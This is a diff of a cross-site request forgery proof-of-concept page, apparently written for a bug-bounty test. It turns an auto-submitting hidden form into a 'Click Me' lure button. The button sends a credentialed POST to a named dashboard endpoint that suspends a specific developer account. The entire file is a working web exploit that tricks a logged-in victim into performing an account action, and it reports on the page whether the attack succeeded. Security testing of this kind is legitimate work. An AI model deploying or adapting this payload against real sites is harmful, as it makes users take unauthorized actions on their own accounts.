@@ -1,16 +1,34 @@
-<!-- csrf-poc.html -->
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Click to Continue</title>
+  </head>
   <body>
-    <form action="https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com/companies/67f7d3bb775cea006358de5d/developers/67fb60eabffdd6006eda8b8a/suspend" method="POST" target="hiddenFrame">
-      <!-- Empty body because it’s not needed -->
-    </form>
-
-    <iframe name="hiddenFrame" style="display:none;"></iframe>
+    <h2>Click the button to continue</h2>
+    <button onclick="sendRequest()">Click Me</button>
 
     <script>
-      // Auto-submit the form on load
-      document.forms[0].submit();
+      function sendRequest() {
+        fetch("https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com/companies/67f7d3bb775cea006358de5d/developers/67fb60eabffdd6006eda8b8a/suspend", {
+          method: "POST",
+          mode: "cors",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: "" // empty body is okay based on your test
+        })
+        .then(response => {
+          if (response.ok) {
+            alert("CSRF Triggered ✅");
+          } else {
+            alert("CSRF Failed ❌ (maybe CSRF token was required)");
+          }
+        })
+        .catch(error => {
+          alert("Error: " + error);
+        });
+      }
     </script>
   </body>
 </html>
